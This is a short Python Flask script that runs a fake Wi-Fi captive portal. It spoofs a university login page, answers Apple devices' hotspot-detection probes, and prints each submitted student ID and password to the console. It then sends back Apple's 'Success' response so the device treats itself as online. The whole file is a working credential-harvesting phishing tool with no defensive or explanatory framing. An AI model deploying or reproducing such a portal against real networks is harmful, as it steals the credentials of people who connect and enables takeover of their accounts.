from flask import Flask, request

app = Flask(__name__)

# A simple "database" to remember if the user is logged in
is_authenticated = False 

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST'])
def catch_all(path):
    global is_authenticated
    
    # 1. Handle the Login Submission (POST)
    if request.method == 'POST':
        user = request.form.get('student_id')
        pwd = request.form.get('student_pass')
        print(f"Captured Credentials -> User: {user} | Pass: {pwd}")
        
        # Mark the user as logged in!
        is_authenticated = True
        return "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"

    # 2. Check if the user is already authenticated
    # If they are, serve the "Success" page so the Mac knows it's online.
    if is_authenticated and "hotspot-detect" in path:
        return "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"

    # 3. Otherwise, serve the Login Page
    if "hotspot-detect" in path:
        print(">> Apple Device detected! Serving Login Page...")
    
    return """
    <html>
    <head><title>University Login</title></head>
    <body style='text-align:center; padding-top:50px;'>
        <h1>Welcome to Lord of the Pings</h1>
        <p>Please log in to continue.</p>
        <form method="POST" action="/login">
            <input type="text" name="student_id" placeholder="Student ID"><br><br>
            <input type="password" name="student_pass" placeholder="Password"><br><br>
            <input type="submit" value="Connect">
        </form>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=False)
